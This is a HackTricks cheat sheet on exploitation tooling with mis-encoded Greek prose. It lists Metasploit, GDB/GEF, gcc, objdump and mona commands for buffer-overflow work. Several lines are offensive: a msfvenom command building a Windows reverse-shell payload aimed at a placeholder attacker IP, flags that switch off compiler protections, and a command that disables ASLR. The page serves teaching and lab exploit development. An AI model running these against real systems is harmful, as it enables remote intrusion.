# Î•ÏÎ³Î±Î»ÎµÎ¯Î± Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Î•Î¹Î´Î¹ÎºÏŒÏ‚ Red Team Ï„Î¿Ï… HackTricks ÏƒÏ„Î¿ AWS)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ GitHub.

</details>

## Metasploit
```
pattern_create.rb -l 3000   #Length
pattern_offset.rb -l 3000 -q 5f97d534   #Search offset
nasm_shell.rb
nasm> jmp esp   #Get opcodes
msfelfscan -j esi /opt/fusion/bin/level01
```
### Shellcodes

### Shellcodes
```
msfvenom /p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> [EXITFUNC=thread] [-e x86/shikata_ga_nai] -b "\x00\x0a\x0d" -f c
```
## GDB

### Î•Î³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·
```
apt-get install gdb
```
### Î Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Î¹
```bash
-q #Â No show banner
-x <file> # Auto-execute GDB instructions from here
-p <pid> #Â Attach to process
```
### ÎŸÎ´Î·Î³Î¯ÎµÏ‚
```bash
run # Execute
start # Start and break in main
n/next/ni # Execute next instruction (no inside)
s/step/si # Execute next instruction
c/continue # Continue until next breakpoint
p system # Find the address of the system function
set $eip = 0x12345678 # Change value of $eip
help # Get help
quit # exit

# Disassemble
disassemble main # Disassemble the function called main
disassemble 0x12345678 # Disassemble taht address
set disassembly-flavor intel # Use intel syntax
set follow-fork-mode child/parent # Follow child/parent process

# Breakpoints
br func # Add breakpoint to function
br *func+23
br *0x12345678
del <NUM> # Delete that number of breakpoint
watch EXPRESSION # Break if the value changes

# info
info functions --> Info abount functions
info functions func --> Info of the funtion
info registers --> Value of the registers
bt # Backtrace Stack
bt full # Detailed stack
print variable
print 0x87654321 - 0x12345678 # Caculate

# x/examine
examine/<num><o/x/d/u/t/i/s/c><b/h/w/g> dir_mem/reg/puntero # Shows content of <num> in <octal/hexa/decimal/unsigned/bin/instruction/ascii/char> where each entry is a <Byte/half word (2B)/Word (4B)/Giant word (8B)>
x/o 0xDir_hex
x/2x $eip # 2Words from EIP
x/2x $eip -4 # $eip - 4
x/8xb $eip # 8 bytes (b-> byte, h-> 2bytes, w-> 4bytes, g-> 8bytes)
i r eip # Value of $eip
x/w pointer # Value of the pointer
x/s pointer # String pointed by the pointer
x/xw &pointer # Address where the pointer is located
x/i $eip # Instructions of the EIP
```
### [GEF](https://github.com/hugsy/gef)
```bash
help memory # Get help on memory command
canary # Search for canary value in memory
checksec #Check protections
p system #Find system function address
search-pattern "/bin/sh" #Search in the process memory
vmmap #Get memory mappings
xinfo <addr> # Shows page, size, perms, memory area and offset of the addr in the page
memory watch 0x784000 0x1000 byte #Add a view always showinf this memory
got #Check got table
memory watch $_got()+0x18 5 #Watch a part of the got table

# Vulns detection
format-string-helper #Detect insecure format strings
heap-analysis-helper #Checks allocation and deallocations of memory chunks:NULL free, UAF,double free, heap overlap

#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp

#Shellcode
shellcode search x86 #Search shellcodes
shellcode get 61 #Download shellcode number 61

#Another way to get the offset of to the RIP
1- Put a bp after the function that overwrites the RIP and send a ppatern to ovwerwrite it
2- efâ¤  i f
Stack level 0, frame at 0x7fffffffddd0:
rip = 0x400cd3; saved rip = 0x6261617762616176
called by frame at 0x7fffffffddd8
Arglist at 0x7fffffffdcf8, args:
Locals at 0x7fffffffdcf8, Previous frame's sp is 0x7fffffffddd0
Saved registers:
rbp at 0x7fffffffddc0, rip at 0x7fffffffddc8
gefâ¤  pattern search 0x6261617762616176
[+] Searching for '0x6261617762616176'
[+] Found at offset 184 (little-endian search) likely
```
### ÎšÏŒÎ»Ï€Î±

#### ÎŠÎ´Î¹ÎµÏ‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ ÏƒÏ„Î¿ GDB

ÎšÎ±Ï„Î¬ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î±Ï€Î¿ÏƒÏ†Î±Î»Î¼Î¬Ï„Ï‰ÏƒÎ·Ï‚ ÏƒÏ„Î¿ GDB, **Î¿ GDB Î¸Î± Î­Ï‡ÎµÎ¹ ÎµÎ»Î±Ï†ÏÏÏ‚ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ­Ï‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ Î±Ï€ÏŒ Î±Ï…Ï„Î­Ï‚ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ ÏŒÏ„Î±Î½ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹.** ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ Ï„Î¿ GDB Î½Î± Î­Ï‡ÎµÎ¹ Ï„Î¹Ï‚ Î¯Î´Î¹ÎµÏ‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ ÎºÎ¬Î½Î¿Î½Ï„Î±Ï‚:

* `unset env LINES`
* `unset env COLUMNS`
* `set env _=<Î´Î¹Î±Î´ÏÎ¿Î¼Î®>` _Î’Î¬Î»Ï„Îµ Ï„Î·Î½ Î±Ï€ÏŒÎ»Ï…Ï„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® Ï€ÏÎ¿Ï‚ Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ_
* Î•ÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ Î¯Î´Î¹Î± Î±Ï€ÏŒÎ»Ï…Ï„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î®
* Î¤Î± `PWD` ÎºÎ±Î¹ `OLDPWD` Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¯Î½Î±Î¹ Ï„Î± Î¯Î´Î¹Î± ÎºÎ±Ï„Î¬ Ï„Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… GDB ÎºÎ±Î¹ ÎºÎ±Ï„Î¬ Ï„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Ï„Î¿Ï… Î´Ï…Î±Î´Î¹ÎºÎ¿Ï

#### Backtrace Î³Î¹Î± ÎµÏÏÎµÏƒÎ· ÎºÎ»Î®ÏƒÎµÏ‰Î½ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½

ÎŒÏ„Î±Î½ Î­Ï‡ÎµÏ„Îµ Î­Î½Î± **Î´Ï…Î±Î´Î¹ÎºÏŒ Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ ÏƒÏ„Î±Ï„Î¹ÎºÎ¬**, ÏŒÎ»ÎµÏ‚ Î¿Î¹ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ Î¸Î± Î±Î½Î®ÎºÎ¿Ï…Î½ ÏƒÏ„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ (ÎºÎ±Î¹ ÏŒÏ‡Î¹ ÏƒÎµ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ­Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚). Î£Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Î¸Î± ÎµÎ¯Î½Î±Î¹ Î´ÏÏƒÎºÎ¿Î»Î¿ Î½Î± **Î±Î½Î±Î³Î½Ï‰ÏÎ¯ÏƒÎµÏ„Îµ Ï„Î· ÏÎ¿Î® Ï€Î¿Ï… Î±ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯ Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î³Î¹Î± Î½Î± Î¶Î·Ï„Î®ÏƒÎµÎ¹ ÎµÎ¯ÏƒÎ¿Î´Î¿ Î±Ï€ÏŒ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î·**.\
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏÎºÎ¿Î»Î± Î½Î± Î±Î½Î±Î³Î½Ï‰ÏÎ¯ÏƒÎµÏ„Îµ Î±Ï…Ï„Î®Î½ Ï„Î· ÏÎ¿Î® **Ï„ÏÎ­Ï‡Î¿Î½Ï„Î±Ï‚** Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î¼Îµ Ï„Î¿ **gdb** Î¼Î­Ï‡ÏÎ¹ Î½Î± ÏƒÎ±Ï‚ Î¶Î·Ï„Î·Î¸ÎµÎ¯ ÎµÎ¯ÏƒÎ¿Î´Î¿Ï‚. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, ÏƒÏ„Î±Î¼Î±Ï„Î®ÏƒÏ„Îµ Ï„Î¿ Î¼Îµ **CTRL+C** ÎºÎ±Î¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® **`bt`** (**backtrace**) Î³Î¹Î± Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î¹Ï‚ ÎºÎ»Î·Î¸ÎµÎ¯ÏƒÎµÏ‚ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚:
```
gefâ¤  bt
#0  0x00000000004498ae in ?? ()
#1  0x0000000000400b90 in ?? ()
#2  0x0000000000400c1d in ?? ()
#3  0x00000000004011a9 in ?? ()
#4  0x0000000000400a5a in ?? ()
```
### Î•Î¾Ï…Ï€Î·ÏÎµÏ„Î·Ï„Î®Ï‚ GDB

`gdbserver --multi 0.0.0.0:23947` (ÏƒÏ„Î¿ IDA Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÏƒÏ…Î¼Ï€Î»Î·ÏÏÏƒÎµÏ„Îµ Ï„Î¿Î½ Î±Ï€ÏŒÎ»Ï…Ï„Î¿ Î´ÏÏŒÎ¼Î¿ Ï„Î¿Ï… ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Î¿Ï… ÏƒÏ„Î· Î¼Î·Ï‡Î±Î½Î® Linux ÎºÎ±Î¹ ÏƒÏ„Î· Î¼Î·Ï‡Î±Î½Î® Windows)

## Ghidra

### Î•ÏÏÎµÏƒÎ· Î¼ÎµÏ„Î±Ï„ÏŒÏ€Î¹ÏƒÎ·Ï‚ ÏƒÏ„Î¿Î¯Î²Î±Ï‚

**Î¤Î¿ Ghidra** ÎµÎ¯Î½Î±Î¹ Ï€Î¿Î»Ï Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ Î³Î¹Î± Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î· **Î¼ÎµÏ„Î±Ï„ÏŒÏ€Î¹ÏƒÎ·** Î³Î¹Î± Î­Î½Î± **buffer overflow Ï‡Î¬ÏÎ· ÏƒÏ„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Ï„Î· Î¸Î­ÏƒÎ· Ï„Ï‰Î½ Ï„Î¿Ï€Î¹ÎºÏÎ½ Î¼ÎµÏ„Î±Î²Î»Î·Ï„ÏÎ½.**\
Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, ÏƒÏ„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î­Î½Î± buffer flow ÏƒÏ„Î¿ `local_bc` Ï…Ï€Î¿Î´Î·Î»ÏÎ½ÎµÎ¹ ÏŒÏ„Î¹ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏƒÏ„Îµ Î¼Î¹Î± Î¼ÎµÏ„Î±Ï„ÏŒÏ€Î¹ÏƒÎ· Ï„Î¿Ï… `0xbc`. Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î±Î½ Ï„Î¿ `local_10` ÎµÎ¯Î½Î±Î¹ Î­Î½Î± canary cookie Ï…Ï€Î¿Î´Î·Î»ÏÎ½ÎµÎ¹ ÏŒÏ„Î¹ Î³Î¹Î± Î½Î± Ï„Î¿ Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎµÏ„Îµ Î±Ï€ÏŒ Ï„Î¿ `local_bc` Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î¼Î¹Î± Î¼ÎµÏ„Î±Ï„ÏŒÏ€Î¹ÏƒÎ· Ï„Î¿Ï… `0xac`.\
_ÎÎ± Î¸Ï…Î¼Î¬ÏƒÏ„Îµ ÏŒÏ„Î¹ Ï„Î¿ Ï€ÏÏÏ„Î¿ 0x08 Î±Ï€ÏŒ ÏŒÏ€Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÏ„Î±Î¹ Ï„Î¿ RIP Î±Î½Î®ÎºÎµÎ¹ ÏƒÏ„Î¿ RBP._

![](<../../.gitbook/assets/image (616).png>)

## GCC

**gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack 1.2.c -o 1.2** --> Î£ÏÎ½Î¸ÎµÏƒÎ· Ï‡Ï‰ÏÎ¯Ï‚ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯ÎµÏ‚\
**-o** --> ÎˆÎ¾Î¿Î´Î¿Ï‚\
**-g** --> Î‘Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ· ÎºÏÎ´Î¹ÎºÎ± (Ï„Î¿ GDB Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï„Î¿Î½ Î´ÎµÎ¹)\
**echo 0 > /proc/sys/kernel/randomize\_va\_space** --> Î“Î¹Î± Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î¿Ï… ASLR ÏƒÏ„Î¿ Linux

**Î“Î¹Î± ÏƒÏÎ½Î¸ÎµÏƒÎ· ÎµÎ½ÏŒÏ‚ shellcode:**\
**nasm -f elf assembly.asm** --> ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹ Î­Î½Î± ".o"\
**ld assembly.o -o shellcodeout** --> Î•ÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Î¿

## Objdump

**-d** --> **Î‘Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ· ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Ï‰Î½** Ï„Î¼Î·Î¼Î¬Ï„Ï‰Î½ (Î´ÎµÎ¯Ï„Îµ Ï„Î¿Ï…Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ ÎµÎ½ÏŒÏ‚ Î¼ÎµÏ„Î±Î³Î»Ï‰Ï„Ï„Î¹ÏƒÎ¼Î­Î½Î¿Ï… shellcode, Î²ÏÎµÎ¯Ï„Îµ ROP Gadgets, Î²ÏÎµÎ¯Ï„Îµ Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚...)\
**-Mintel** --> Î£ÏÎ½Ï„Î±Î¾Î· **Intel**\
**-t** --> Î Î¯Î½Î±ÎºÎ±Ï‚ **ÏƒÏ…Î¼Î²ÏŒÎ»Ï‰Î½**\
**-D** --> **Î‘Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ· ÏŒÎ»Ï‰Î½** (Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÏƒÏ„Î±Ï„Î¹ÎºÎ®Ï‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î®Ï‚)\
**-s -j .dtors** --> Ï„Î¼Î®Î¼Î± dtors\
**-s -j .got** --> Ï„Î¼Î®Î¼Î± got\
\-D -s -j .plt --> Ï„Î¼Î®Î¼Î± plt **Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»Î¿Î³Î·Î¼Î­Î½Î¿**\
**-TR** --> **Î‘Î½Î±ÎºÎ±Ï„ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚**\
**ojdump -t --dynamic-relo ./exec | grep puts** --> Î”Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î¿Ï… "puts" Î³Î¹Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÏƒÏ„Î¿ GOT\
**objdump -D ./exec | grep "VAR\_NAME"** --> Î”Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Î¼Î¹Î±Ï‚ ÏƒÏ„Î±Ï„Î¹ÎºÎ®Ï‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î®Ï‚ (Î±Ï…Ï„Î­Ï‚ Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î¿ Ï„Î¼Î®Î¼Î± DATA).

## Core dumps

1. Î•ÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ `ulimit -c unlimited` Ï€ÏÎ¹Î½ Î¾ÎµÎºÎ¹Î½Î®ÏƒÎµÏ„Îµ Ï„Î¿ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î¬ Î¼Î¿Ï…
2. Î•ÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ `sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t`
3. `sudo gdb --core=\<path/core> --quiet`

## Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ±

**ldd executable | grep libc.so.6** --> Î”Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· (Î±Î½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ASLR, Ï„ÏŒÏ„Îµ Î±Ï…Ï„Î® Î±Î»Î»Î¬Î¶ÎµÎ¹ ÎºÎ¬Î¸Îµ Ï†Î¿ÏÎ¬)\
**for i in \`seq 0 20\`; do ldd \<Ejecutable> | grep libc; done** --> Î•Ï€Î±Î½Î¬Î»Î·ÏˆÎ· Î³Î¹Î± Î½Î± Î´ÎµÎ¯Ï„Îµ Î±Î½ Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Î±Î»Î»Î¬Î¶ÎµÎ¹ Ï€Î¿Î»Ï\
**readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system** --> ÎœÎµÏ„Î±Ï„ÏŒÏ€Î¹ÏƒÎ· Ï„Î¿Ï… "system"\
**strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh** --> ÎœÎµÏ„Î±Ï„ÏŒÏ€Î¹ÏƒÎ· Ï„Î¿Ï… "/bin/sh"

**strace executable** --> Î£Ï…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ Ï€Î¿Ï… ÎºÎ±Î»Î¿ÏÎ½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Î¿\
**rabin2 -i ejecutable -->** Î”Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½

## **Inmunity debugger**
```bash
!mona modules    #Get protections, look for all false except last one (Dll of SO)
!mona find -s "\xff\xe4" -m name_unsecure.dll   #Search for opcodes insie dll space (JMP ESP)
```
## IDA

### Î‘Ï€Î¿ÏƒÏ†Î±Î»Î¼Î¬Ï„Ï‰ÏƒÎ· ÏƒÎµ Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Linux

ÎœÎ­ÏƒÎ± ÏƒÏ„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ Ï„Î¿Ï… IDA Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î´Ï…Î±Î´Î¹ÎºÎ¬ Î±ÏÏ‡ÎµÎ¯Î± Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î³Î¹Î± Ï„Î·Î½ Î±Ï€Î¿ÏƒÏ†Î±Î»Î¼Î¬Ï„Ï‰ÏƒÎ· ÎµÎ½ÏŒÏ‚ Î´Ï…Î±Î´Î¹ÎºÎ¿Ï Î±ÏÏ‡ÎµÎ¯Î¿Ï… ÏƒÎµ Î­Î½Î± ÏƒÏÏƒÏ„Î·Î¼Î± Linux. Î“Î¹Î± Î½Î± Ï„Î¿ ÎºÎ¬Î½ÎµÏ„Îµ Î±Ï…Ï„ÏŒ, Î¼ÎµÏ„Î±Ï†Î­ÏÎµÏ„Îµ Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ _linux\_server_ Î® _linux\_server64_ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Linux ÎºÎ±Î¹ ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ Ï„Î¿ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿:
```
./linux_server64 -Ppass
```
Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, ÏÏ…Î¸Î¼Î¯ÏƒÏ„Îµ Ï„Î¿Î½ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÏ„Î® ÏƒÏ†Î±Î»Î¼Î¬Ï„Ï‰Î½: Î•Î½Ï„Î¿Ï€Î¹ÏƒÏ„Î®Ï‚ (Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î¿Ï‚ linux) --> Î•Ï€Î¹Î»Î¿Î³Î­Ï‚ Î´Î¹ÎµÏÎ³Î±ÏƒÎ¹ÏÎ½...:

![](<../../.gitbook/assets/image (101).png>)

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± Ï„Î·Î»ÎµÎ³ÏÎ±Ï†Î®Î¼Î±Ï„Î¿Ï‚**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
